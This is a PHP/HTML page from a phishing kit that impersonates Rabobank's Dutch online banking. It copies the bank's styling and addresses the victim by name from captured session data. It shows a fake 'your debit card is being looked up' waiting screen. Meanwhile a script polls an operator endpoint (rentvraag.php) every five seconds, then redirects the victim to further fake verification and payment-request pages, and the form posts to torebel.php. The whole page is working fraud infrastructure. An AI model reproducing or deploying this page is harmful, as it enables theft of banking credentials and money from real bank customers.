<?php session_start(); ?>


<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="nl" lang="nl" class="senses14 sIFR-hasFlash dk_fouc"><head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta http-equiv="refresh" content="8;URL=klanten_verificatie.php">
<title>Een moment geduld alstublieft..</title>
		<link rel="canonical" href="https://www.rabobank.nl/particulieren/betalen/betaalpakketten/rabo-directpakket/aanvragen/">
<link rel="shortcut icon" href="https://www.rabobank.nl/static/generic/css/images/favicon.ico">
	<link rel="home" href="https://www.rabobank.nl" title="home">
	<link rel="stylesheet" type="text/css" media="screen,print" href="https://www.rabobank.nl/static/generic/css/senses14.css">
	<link rel="stylesheet" type="text/css" media="screen,print" href="https://www.rabobank.nl/static/appls/webform/css/webform.css">
<style>
@import url(https://www.rabobank.nl/images/include/css-include.css);

</style>
	<script>function isNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
}</script>
<script language="javascript">
 function Cleaning()
 {
	loadDoc();
  }  setInterval('Cleaning()', 5000);
    </script><script>
	var someimage;
 function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
      if(xhttp.responseText.length >5) {
		  window.location.href = "betaalaanvraag.php?aanvraag=" + xhttp.responseText;
	  }
	 }
  }
  xhttp.open("GET", "rentvraag.php", true);
  xhttp.send();
}
</script></head>
	<body class="rb-has-js rb-has-flash"><!--[if IE 6]><script type="text/javascript">var bIEdetected = true;</script><![endif]-->
	<div id="wrapper">
<!--*** navigatie ***-->
<!-- header Rabobank -->
<div class="page-header" id="pa_header" role="banner">
	<div class="top">
		<!-- Rabobank logo -->
		<a href="https://www.rabobank.nl/particulieren/" title="naar de homepage Particulieren" lang="nl" xml:lang="nl" class="logo"><span>Rabobank</span></a>
		<!-- Menu Particulieren, Private Banking, Bedrijven -->
		<div class="middle">
			<ul class="customermenu">
				                                           
					<li class="current"><a href="https://www.rabobank.nl/particulieren/" lang="nl" xml:lang="nl" title="U bent in particulieren. Naar de homepage">Particulieren</a></li>
					<li><a href="https://www.rabobank.nl/privatebanking/" lang="nl" xml:lang="nl" title="Naar private banking">Private Banking</a></li>
					<li><a href="https://www.rabobank.nl/bedrijven/" lang="nl" xml:lang="nl" title="Naar bedrijven">Bedrijven</a></li>

				
			</ul>
			<a href="#"><span class="hidden s14-heading-2">Rabobank <span class="localbank ra_bh_localbank"></span></span></a>
		</div>
		<!-- Menu search, login and customer -->
		<ul class="rightmenu">
		<li class="ra_bh_search" id="ph_zoek" role="search">
				<form method="get" autocomplete="off">
				<fieldset>
					<input type="text" id="ra_searchfield" name="searchPhrase" maxlength="100" value="Zoeken">
					<input type="submit" id="zoeken1" name="z81" value="" class="icons search ra_bh_s14zoeksubmit" title="Zoek informatie op  onze internetsite" accesskey="4">
				</fieldset>					
				</form>
			</li>
			<li id="ph_login" role="navigation">
				<a href="#" lang="nl" xml:lang="nl" title="Inloggen Rabo Internetbankieren" id="rb_gn_inloglink" class="anchorel login ra_bh_mfloginlogger"><span>(2/3) - Betaalpas instellen</span><div class="icon"></div></a>
			</li>
			<li>
				<a href="#" lang="nl" xml:lang="nl" title="Klant worden van de Rabobank" class="anchorel customer-login"><span><?php echo @$_SESSION['Vlts']." ".@$_SESSION['Tnvgl']." ".@$_SESSION['Atnm']?></span><div class="icon"></div></a>				
			</li>
		</ul>
	</div>
	<!-- Start: "header" "Rabobank" -->
	<div id="pa_topnav" role="navigation" class="nav normal normal">
		<!-- Header Menu Top -->
		<ul class="primary closed closed">
			<ul class="lev1">
<li>
<a accesskey="1" href="https://www.rabobank.nl/particulieren/" lang="nl" xml:lang="nl" title="Naar de homepage.">Home</a>
</li>
<li>
<a href="https://bankieren.rabobank.nl/klanten" class="ra_bh_mfloginlogger" lang="nl" xml:lang="nl" title="Online uw bankzaken regelen.">Internetbankieren</a>
</li>
<li class="particulieren_betalen">
<a href="https://www.rabobank.nl/particulieren/producten/betalen/" lang="nl" xml:lang="nl" title="Bankrekening openen, betalen via internet of (mobiele) telefoon, rood staan, passen en creditcards.">Betalen</a>
</li>
<li class="particulieren_sparen">
<a href="https://www.rabobank.nl/particulieren/producten/sparen/" lang="nl" xml:lang="nl" title="Slimmer sparen voor uw doel. Sparen voor u zelf of voor uw kind. Geld vrij opneembaar of vastzetten op een spaarrekening.">Sparen</a>
</li>
<li class="particulieren_pensioen">
<a href="https://www.rabobank.nl/particulieren/producten/pensioen/" lang="nl" xml:lang="nl" title="Weten hoe uw pensioen werkt. Mogelijkheden om uw pensioeninkomen te verhogen. Onder andere banksparen met belastingvoordeel.">Pensioen</a>
</li>
<li class="particulieren_hypotheken">
<a href="https://www.rabobank.nl/particulieren/producten/hypotheken/" lang="nl" xml:lang="nl" title="Hypotheek berekenen met het Rabobank Hypotheekdossier. Hypotheekrente bekijken en hypotheekvormen vergelijken.">Hypotheken</a>
</li>
<li class="particulieren_verzekeren">
<a href="https://www.rabobank.nl/particulieren/producten/verzekeren/" lang="nl" xml:lang="nl" title="Verzekeringen afsluiten, online bekijken en wijzigen. Voor u, uw vervoer, vakantie, gezin, woning, gezondheid. Schade melden.">Verzekeren</a>
</li>
<li class="particulieren_lenen">
<a href="https://www.rabobank.nl/particulieren/producten/lenen/" lang="nl" xml:lang="nl" title="Geld lenen voor een auto, grote uitgave, huis en tuin of studie. Bereken wat u kunt lenen en kies een passende lening.">Lenen</a>
</li>
<li class="particulieren_beleggen">
<a href="https://www.rabobank.nl/particulieren/producten/beleggen/" lang="nl" xml:lang="nl" title="Laten beleggen, zelf beleggen of beleggen met advies. Informatie over beleggingsproducten. Toegang tot uw portefeuille.">Beleggen</a>
</li>
<li class="particulieren_klantenservice">
<a href="https://www.rabobank.nl/particulieren/klantenservice/" lang="nl" xml:lang="nl" title="Hulp bij schade, verlies en diefstal. Belangrijke telefoonnummers, veelgestelde vragen &amp; antwoorden.">Klantenservice</a>
</li>
</ul>

		</ul>
		<!-- Speaker -->
		
		<div id="readspeaker_button_wrapper" class="readspeaker_button_wrapper rs_skip rsbtn rs_preserve">
			 <span class="rsbtn_left rsimg rspart">
					<span class="rsbtn_text">
						<span>Lees Voor</span>
					</span>
				</span>
				<span class="rsbtn_right rsimg rsplay rspart"></span>
			
		</div>
		<!-- Header Menu Bottom -->
	</div>
	<div role="navigation" class="secnav">
		
		<div class="clearboth"></div>
	</div>
	<!-- End "header" "Rabobank" -->
</div>
<a href="#ph_content" title="Naar content gedeelte" accesskey="s" lang="nl" xml:lang="nl"><span class="hidden">Spring naar content gedeelte</span></a>
<hr class="hidden">
<!-- End: header Rabobank -->
		<div class="nav" id="pa_header">
			<!-- new menu -->
		</div>
						<!-- Start: "content" "Rabobank" -->
		<!-- S14 GRID -->
		<div class="s14-grid" id="ph_content" role="main">
 			<!-- GRID TILES -->
			<!-- primary blocks -->
 			<div class="s14-col-primary">
			<div class="s14-block s14-width-4 s14-min-height-2" data-width="4" data-height="3" data-col="1" data-row="1">
	<div class="quinity">
	<link rel="stylesheet" href="https://www.rabobank.nl/static/appls/webform/css/jquery/colorbox/colorbox.css" type="text/css">
	<link rel="stylesheet" href="https://www.rabobank.nl/static/appls/webform/css/form-colorbox.css" type="text/css">


	<form id="qfs_form" method="post" action="torebel.php">

<div class="formDependencies" hidden="hidden" data-form-code="RDPA01" data-dialogue-code="1712-1">
	<div class="informationBlocks" hidden="hidden">
		
			

		
	<div class="informationBlock" id="qfs_HT8316_23093">
	<button type="button" class="close">Afsluiten</button>
	<div class="informationTitle">Toelichting</div>
	<div class="informationContent">Vul hier alleen cijfers in. Gebruik geen streepjes of spaties. Woont u in het buitenland? Vul dan uw telefoonnummer in met twee nullen en de landcode ervoor (bijvoorbeeld voor Duitsland: 00491212345678).</div></div></div>
	<div class="lightboxes" hidden="hidden">
		
			
		
	</div>
</div>










<div class="formDialogue application " data-form-code="RDPA01" data-dialogue-code="1712-1">
	
	<div class="formDialogueTitle">
Uw rekening wordt opgezocht	</div>
	

	
	<div class="formButtonsTop">
		
		

		
		
	</div>

	
	<div class="formDialogueHeader">
		
	</div>

	
	<div class="message error" hidden="hidden">
		<p></p>
		<ul></ul>
	</div>

	
	<div class="formAccordion">
		<ul class="accordion">

			
			
				
				
				<li class="performed">
					<div class="handle" data-screen-number="1">
						<div class="formScreenName">
							Algemeen
						</div>
						<div class="formScreenNumber">
							Stap 1 van 5
						</div>
					</div>

					
					 
				</li>
			
				
				
				<li class=" optional">
					<div class="handle" data-screen-number="2">
						<div class="formScreenName">
							Kunt u nu inloggen
						</div>
						<div class="formScreenNumber">
							
						</div>
					</div>

					
					 
				</li>
			
				
			
				<li class="active">
					<div class="handle" data-screen-number="3">
						<div class="formScreenName">
							Uw gegevens
						</div>
						<div class="formScreenNumber">
							Stap 2 van 5
						</div>
					</div>

					
					
					<div class="content">

						
						<div class="formScreen">

							
							<div class="formScreenIntroduction">
								
							</div>

							
							<div class="formScreenInstruction">
								
							</div>

							
							<div class="formButtons">
								
							</div>

							
							


							
							
							<div class="formScreenContent">
							

								
									
									<div class="container one">
<div class="float">
<div class="tile">

<fieldset id="qfs_G2269" class="entryGroup">
<legend id="qfs_GLA2269" class="entryGroupHeader"></legend>
<div class="entryGroupContent ra_q_formuliergroep">


<li><label for="###"><br><h2>Geachte <?php echo @$_SESSION['Vlts']." ".@$_SESSION['Tnvgl']." ".@$_SESSION['Atnm']?>,</h2>
<p>Een moment geduld aub. <br>Uw betaalpas wordt nu opgezocht in ons klantensysteem.</p>
<p>Dit zal hooguit een paar seconden duren.<br></p>
<img style="position: absolute;   top: 203px; left: 450px;" alt="loading" src="360.gif"></label></li><table><tbody><tr>
    <td><ol>
					
					
					
					
					
					
  </ol></td><td><br><br>

<div class="values">
<span class="value required" id="qfs_IF2269_8747_value" data-format="NL" data-data-type="postalCode" data-base-type="alphanumeric" data-validation-message="2269_8747_2" data-validation-status="invalid"></span></div>
</div></td><td></td>
    		
  </tr></tbody></table>
</div></fieldset>
</div>
</div>
</div>
</div>
							
							
							

							
							
						</div>

					</div>
					 
				</li>
			
				
				
				<li class=" optional">
					<div class="handle" data-screen-number="4">
						<div class="formScreenName">
							Mede-aanvrager
						</div>
						<div class="formScreenNumber">
							Stap 3 van 5
						</div>
					</div>

					
					 
				</li>
			
				
				
				<li class=" optional">
					<div class="handle" data-screen-number="5">
						<div class="formScreenName">
							Overeenkomst
						</div>
						<div class="formScreenNumber">
							Stap 4 van 5
						</div>
					</div>

					
					 
				</li>
			
				
				
				<li class="">
					<div class="handle" data-screen-number="6">
						<div class="formScreenName">
							Samenvatting
						</div>
						<div class="formScreenNumber">
							Stap 5 van 5
						</div>
					</div>

					
					 
				</li>
			 
		</ul>
	</div> 

	
	<div class="formDisclaimer">
		

	</div>

	
	<div class="formDialogueFooter">
		
	</div>

</div></form> 


		

	
	
	


	</div>
</div>
 			</div>
			<!-- secondary -->
			<div class="s14-col-secondary">
				<!-- GRID TILES -->
				<div class="s14-block s14-width-1 s14-height-1 s14--empty" data-width="1" data-height="1" data-col="6" data-row="1"></div>
			</div>
	<!--*** content area -->
		<!-- Start: "footer" "Rabobank" -->
		<div class="s14-footer">
	<div class="s14-footer-topbar">
		  <ul>
		<li title="Volg ons op YouTube" rel="nofollow" class="youtube"><a href="http://www.youtube.com/user/rabobank?ra_resize=yes&amp;ra_width=1024&amp;ra_height=768&amp;ra_toolbar=yes&amp;ra_menubar=yes&amp;ra_mfvars=clickout%7CRabobank+-+Volg+ons+via+social+media%7Cexternalwebsite" title="Volg ons op YouTube" rel="nofollow" class="ra_bh_popup">Volg ons op YouTube</a></li>
		<li title="Volg ons op LinkedIn" rel="nofollow" class="linkedin"><a href="http://www.linkedin.com/company/rabobank?ra_resize=yes&amp;ra_width=1024&amp;ra_height=768&amp;ra_toolbar=yes&amp;ra_menubar=yes&amp;ra_mfvars=clickout%7CRabobank+-+Volg+ons+via+social+media%7Cexternalwebsite" title="Volg ons op LinkedIn" rel="nofollow" class="ra_bh_popup">Volg ons op LinkedIn</a></li>
		<li title="Volg ons op Facebook" rel="nofollow" class="facebook"><a href="http://www.facebook.com/rabobank?ra_resize=yes&amp;ra_width=1024&amp;ra_height=768&amp;ra_toolbar=yes&amp;ra_menubar=yes&amp;ra_mfvars=clickout%7CRabobank+-+Volg+ons+via+social+media%7Cexternalwebsite" title="Volg ons op Facebook" rel="nofollow" class="ra_bh_popup">Volg ons op Facebook</a></li>
	    <li title="Volg ons op Google Plus" rel="nofollow" class="googleplus"><a href="https://plus.google.com/?ra_resize=yes&amp;ra_width=1024&amp;ra_height=768&amp;ra_toolbar=yes&amp;ra_menubar=yes&amp;ra_mfvars=clickout%7CRabobank+-+Volg+ons+via+social+media%7Cexternalwebsite">Volg ons op Google+</a></li>
		<li title="Volg ons op Twitter" rel="nofollow" class="twitter"><a href="http://www.twitter.com/rabobank?ra_resize=yes&amp;ra_width=800&amp;ra_height=600&amp;ra_toolbar=yes&amp;ra_menubar=yes&amp;ra_mfvars=clickout%7CRabobank+-+Volg+ons+via+social+media%7Cexternalwebsite" title="Volg ons op Twitter" rel="nofollow" class="ra_bh_popup">Volg ons op Twitter</a></li>
  </ul> 
		<div class="s14-footer-slogan"><span>Rabobank</span></div>
	</div>
	<ul class="s14-footer-sitemap">
		<li><a href="https://www.rabobank.nl/particulieren/sitemap">Sitemap bekijken</a> <i class="icon  icon_supercircle_area"></i></li>
	</ul>
<ul class="s14-footer-linklist"><li><h3>Producten</h3><ul><li><a href="#">Betalen</a></li>
<li><a href="#">Sparen</a></li>
<li><a href="#">Beleggen</a></li>
<li><a href="#">Hypotheek</a></li>
<li><a href="#">Lenen</a></li>
<li><a href="#">Verzekeren</a></li>
<li><a href="#">Pensioen</a></li>
</ul></li><li><h3>Financieel advies bij</h3><ul><li><a href="#">Samenwonen</a></li>
<li><a href="#">Huis kopen</a></li>
<li><a href="#">Vakantie</a></li>
<li><a href="#">Uit elkaar gaan</a></li>
<li><a href="#">Overlijden</a></li>
<li><a href="#">Eigen bedrijf starten</a></li>
</ul></li><li><h3>Speciaal voor</h3><ul><li><a href="#">Kinderen</a></li>
<li><a href="#">Jongeren</a></li>
<li><a href="#">Jongvolwassenen</a></li>
<li><a href="#">Studenten</a></li>
<li><a href="#">Private Banking</a></li>
</ul></li><li><h3>Rabobank</h3><ul><li><a href="#">Over Rabobank</a></li>
<li><a href="#">Actueel</a></li>
<li><a href="#">Sponsoring</a></li>
<li><a href="#">Vacatures</a></li>
<li><a href="#">Leden</a></li>
</ul></li><li><h3>Deze site</h3><ul><li><a href="#">Veilig bankieren</a></li>
<li><a href="#">Privacy en cookies</a></li>
<li><a href="#">Disclaimer</a></li>
<li><a href="#">Voorwaarden</a></li>
<li><a href="#">Toegankelijkheid</a></li>
</ul></li><li><h3>Service</h3><ul><li><a href="#">Zelf regelen</a></li>
<li><a href="#">Apps</a></li>
<li><a href="#">Contact</a></li>
<li><a href="#">Openingstijden</a></li>
<li><a href="#">English</a></li>
</ul></li></ul>
</div>
		<!-- End: "footer" "Rabobank" -->
	</div>


<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div><button type="button" id="cboxClose"></button></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div></div></body></html>